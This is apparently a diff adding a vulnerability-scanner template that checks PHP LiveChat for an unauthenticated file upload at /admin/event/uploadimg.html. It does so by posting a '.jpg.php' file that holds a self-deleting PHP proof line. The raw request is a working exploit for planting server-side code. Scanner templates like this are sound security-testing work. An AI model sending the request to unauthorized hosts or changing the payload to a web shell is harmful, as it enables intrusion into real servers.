@@ -1,0 +1,34 @@
+id: php-livechat-uploadimg-html-upload
+
+info:
+  name: PHP LiveChat Upload
+  author: xpoc
+  severity: critical
+  reference:
+    - https://mp.weixin.qq.com/s/-LnDOjoqYMjtjoVV9l-EuA
+variables:
+  filename: "{{rand_base(6)}}"
+  
+http:
+  - raw:
+      - |-
+        POST /admin/event/uploadimg.html HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36
+        Content-Length: 240
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarysnjxcdjt
+        Accept-Encoding: gzip, deflate
+        Connection: close
+
+        ------WebKitFormBoundarysnjxcdjt
+        Content-Disposition: form-data; name="editormd-image-file"; filename="{{filename}}.jpg.php"
+        Content-Type: application/octet-stream
+
+        <?php echo md5(1);unlink(__FILE__);?>
+        ------WebKitFormBoundarysnjxcdjt--
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '.php'
